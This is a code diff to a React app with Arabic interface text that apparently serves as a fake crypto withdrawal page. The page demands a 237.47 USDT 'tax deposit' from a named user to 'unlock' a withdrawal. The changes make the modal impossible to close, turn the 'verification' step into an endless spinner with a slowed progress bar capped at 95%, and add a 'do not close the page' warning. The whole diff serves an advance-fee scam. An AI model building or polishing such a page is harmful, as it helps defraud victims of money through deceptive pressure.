@@ -16,7 +16,19 @@ import {
   Copy,
   Loader2
 } from 'lucide-react';
-import { MenuItemProps, NavItemProps } from './types';
+
+interface MenuItemProps {
+  icon: React.ReactNode;
+  label: string;
+  onClick?: () => void;
+}
+
+interface NavItemProps {
+  icon: React.ReactNode;
+  label: string;
+  active?: boolean;
+  onClick?: () => void;
+}
 
 // Custom SVG Avatar to match the screenshot's geometric design
 const CustomAvatar = () => (
@@ -67,8 +79,8 @@ const App: React.FC = () => {
 
   return (
     <div className="relative min-h-screen bg-[#F8F9FB] overflow-x-hidden">
-      {/* Main Content with conditional Blur - Reduced from 5px to 2px */}
-      <div className={`main-container transition-all duration-300 ${modalStep > 0 && modalStep < 5 ? 'blur-[2px] pointer-events-none' : ''}`}>
+      {/* المحتوى الرئيسي مغلق تماماً (pointer-events-none) وبضبابية طالما الـ Modal مفتوح */}
+      <div className={`main-container transition-all duration-300 ${modalStep >= 1 ? 'blur-[2px] pointer-events-none select-none' : ''}`}>
         {/* Header Section */}
         <div className="bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] pt-14 pb-14 px-5 relative overflow-hidden">
           <div className="flex items-center justify-between">
@@ -149,14 +161,15 @@ const App: React.FC = () => {
         </div>
       </div>
 
-      {/* Modal Overlay System */}
-      {modalStep > 0 && modalStep < 5 && (
-        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/40 backdrop-blur-[1px]">
+      {/* نظام النوافذ المنبثقة - لا يغلق أبداً طالما modalStep >= 1 */}
+      {modalStep >= 1 && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/60 backdrop-blur-[1px]">
+          {/* تم إزالة أي onClick من الخلفية لضمان عدم الإغلاق عند النقر بالخارج */}
           <div className="bg-white w-full max-w-[340px] rounded-[24px] shadow-2xl p-6 flex flex-col items-center text-center animate-in fade-in zoom-in duration-300">
             
-            {/* Step 1: Welcome */}
+            {/* المرحلة 1: الترحيب */}
             {modalStep === 1 && (
-              <div dir="rtl" className="space-y-4">
+              <div dir="rtl" className="space-y-4 w-full">
                 <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto">
                    <User className="text-blue-600" size={32} />
                 </div>
@@ -176,7 +189,7 @@ const App: React.FC = () => {
               </div>
             )}
 
-            {/* Step 2: Wallet Input */}
+            {/* المرحلة 2: إدخال المحفظة */}
             {modalStep === 2 && (
               <div dir="rtl" className="w-full space-y-4">
                 <h3 className="text-[17px] font-bold text-gray-900">إدخال عنوان المحفظة</h3>
@@ -198,9 +211,9 @@ const App: React.FC = () => {
               </div>
             )}
 
-            {/* Step 3: Payment Info */}
+            {/* المرحلة 3: معلومات الدفع */}
             {modalStep === 3 && (
-              <div dir="rtl" className="space-y-4">
+              <div dir="rtl" className="space-y-4 w-full">
                 <h3 className="text-[17px] font-bold text-gray-900">تنبيه إيداع الضريبة</h3>
                 <div className="text-[13px] text-gray-600 text-right leading-relaxed bg-blue-50 p-4 rounded-[16px]">
                   أهلاً بك <span className="font-bold">yamen 1992</span>، بقي أمر إيداع مبلغ <span className="font-bold text-blue-700">237.47 USDT BEP-20</span> لفتح قناة السحب.
@@ -229,9 +242,9 @@ const App: React.FC = () => {
               </div>
             )}
 
-            {/* Step 4: Verification */}
-            {modalStep === 4 && (
-              <div dir="rtl" className="space-y-5 py-2">
+            {/* المرحلة 4 وما بعدها: التحقق الدائم */}
+            {modalStep >= 4 && (
+              <div dir="rtl" className="space-y-5 py-2 w-full">
                 <div className="flex justify-center">
                    <Loader2 className="animate-spin text-blue-600" size={40} />
                 </div>
@@ -242,6 +255,9 @@ const App: React.FC = () => {
                 <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden">
                   <div className="h-full bg-blue-600 animate-progress"></div>
                 </div>
+                <p className="text-[11px] text-gray-400 animate-pulse">
+                  قد تستغرق هذه العملية بضع دقائق، يرجى عدم إغلاق الصفحة.
+                </p>
               </div>
             )}
 
@@ -253,10 +269,10 @@ const App: React.FC = () => {
       <style>{`
         @keyframes progress {
           0% { width: 0%; }
-          100% { width: 90%; }
+          100% { width: 95%; }
         }
         .animate-progress {
-          animation: progress 15s ease-out forwards;
+          animation: progress 60s ease-out forwards;
         }
       `}</style>
     </div>
